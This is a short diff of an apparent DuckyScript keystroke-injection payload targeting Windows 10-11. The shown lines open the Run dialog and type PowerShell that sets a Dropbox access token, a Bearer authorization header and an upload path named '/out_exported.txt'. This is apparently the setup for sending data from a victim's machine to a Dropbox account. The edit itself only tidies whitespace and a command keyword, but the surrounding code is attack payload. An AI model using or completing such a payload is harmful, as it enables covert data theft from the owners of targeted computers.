@@ -8,10 +8,8 @@ REM # Target       : Windows 10-11                            |
 REM #                                                         |
 REM ###########################################################
 
-
 REM Requirements:
 REM     - Internet connection
-
 
 GUI r
 DELAY 1000
@@ -31,7 +29,7 @@ STRING $accessToken =
 STRING DROPBOX_ACCESS_TOKEN
 ENTER
 
-STRINGLN
+STRINGLN_BLOCK
     $authHeader = @{Authorization = "Bearer $accessToken"}
     $dropboxFilePath = "/out_exported.txt"
 
